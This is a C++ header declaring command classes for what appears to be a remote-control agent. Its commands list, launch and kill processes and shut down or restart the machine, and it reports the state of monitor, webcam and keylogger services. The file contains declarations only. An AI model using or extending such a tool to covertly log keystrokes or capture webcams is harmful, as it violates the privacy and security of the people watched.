#pragma once
#include "core/ICommand.hpp"
#include "interfaces/IAppManager.hpp"
#include <memory>
#include <sstream>

namespace handlers {

// ============================================================================
// AppCommandHandler - Handles application management commands
// ============================================================================
// Commands: ping, get_state, list_apps, get_apps, list_process,
//           launch_app, kill_process, search_apps, shutdown, restart
// ============================================================================

class AppCommandHandler final : public core::command::ICommandHandler {
public:
    // State query callback (for get_state command)
    struct ServiceState {
        bool monitor_active = false;
        bool webcam_active = false;
        bool keylogger_active = false;
    };
    using GetStateFn = std::function<ServiceState()>;

    AppCommandHandler(
        std::shared_ptr<interfaces::IAppManager> app_manager,
        GetStateFn get_state_fn
    )   : app_manager_(std::move(app_manager))
        , get_state_fn_(std::move(get_state_fn))
    {}

    bool can_handle(const std::string& cmd) const override;
    const char* category() const noexcept override { return "App"; }

    std::unique_ptr<core::command::ICommand> parse_command(
        const std::string& cmd,
        const std::string& args,
        const core::command::CommandContext& ctx
    ) override;

private:
    std::shared_ptr<interfaces::IAppManager> app_manager_;
    GetStateFn get_state_fn_;
};

// ============================================================================
// App Commands
// ============================================================================

class PingCommand final : public core::command::ICommand {
public:
    explicit PingCommand(core::command::CommandContext ctx) : ctx_(std::move(ctx)) {}
    common::EmptyResult execute() override;
    const char* type() const noexcept override { return "ping"; }
private:
    core::command::CommandContext ctx_;
};

class GetStateCommand final : public core::command::ICommand {
public:
    GetStateCommand(AppCommandHandler::GetStateFn get_state, core::command::CommandContext ctx)
        : get_state_(std::move(get_state)), ctx_(std::move(ctx)) {}
    common::EmptyResult execute() override;
    const char* type() const noexcept override { return "get_state"; }
private:
    AppCommandHandler::GetStateFn get_state_;
    core::command::CommandContext ctx_;
};

class ListAppsCommand final : public core::command::ICommand {
public:
    ListAppsCommand(std::shared_ptr<interfaces::IAppManager> mgr, bool only_running,
                    core::command::CommandContext ctx)
        : mgr_(std::move(mgr)), only_running_(only_running), ctx_(std::move(ctx)) {}
    common::EmptyResult execute() override;
    const char* type() const noexcept override { return only_running_ ? "list_process" : "list_apps"; }
private:
    std::shared_ptr<interfaces::IAppManager> mgr_;
    bool only_running_;
    core::command::CommandContext ctx_;
};

class LaunchAppCommand final : public core::command::ICommand {
public:
    LaunchAppCommand(std::shared_ptr<interfaces::IAppManager> mgr, std::string command,
                     core::command::CommandContext ctx)
        : mgr_(std::move(mgr)), command_(std::move(command)), ctx_(std::move(ctx)) {}
    common::EmptyResult execute() override;
    const char* type() const noexcept override { return "launch_app"; }
private:
    std::shared_ptr<interfaces::IAppManager> mgr_;
    std::string command_;
    core::command::CommandContext ctx_;
};

class KillProcessCommand final : public core::command::ICommand {
public:
    KillProcessCommand(std::shared_ptr<interfaces::IAppManager> mgr, uint32_t pid,
                       core::command::CommandContext ctx)
        : mgr_(std::move(mgr)), pid_(pid), ctx_(std::move(ctx)) {}
    common::EmptyResult execute() override;
    const char* type() const noexcept override { return "kill_process"; }
private:
    std::shared_ptr<interfaces::IAppManager> mgr_;
    uint32_t pid_;
    core::command::CommandContext ctx_;
};

class SearchAppsCommand final : public core::command::ICommand {
public:
    SearchAppsCommand(std::shared_ptr<interfaces::IAppManager> mgr, std::string query,
                      core::command::CommandContext ctx)
        : mgr_(std::move(mgr)), query_(std::move(query)), ctx_(std::move(ctx)) {}
    common::EmptyResult execute() override;
    const char* type() const noexcept override { return "search_apps"; }
private:
    std::shared_ptr<interfaces::IAppManager> mgr_;
    std::string query_;
    core::command::CommandContext ctx_;
};

class SystemControlCommand final : public core::command::ICommand {
public:
    enum class Action { Shutdown, Restart };
    SystemControlCommand(std::shared_ptr<interfaces::IAppManager> mgr, Action action,
                         core::command::CommandContext ctx)
        : mgr_(std::move(mgr)), action_(action), ctx_(std::move(ctx)) {}
    common::EmptyResult execute() override;
    const char* type() const noexcept override {
        return action_ == Action::Shutdown ? "shutdown" : "restart";
    }
private:
    std::shared_ptr<interfaces::IAppManager> mgr_;
    Action action_;
    core::command::CommandContext ctx_;
};

} // namespace handlers
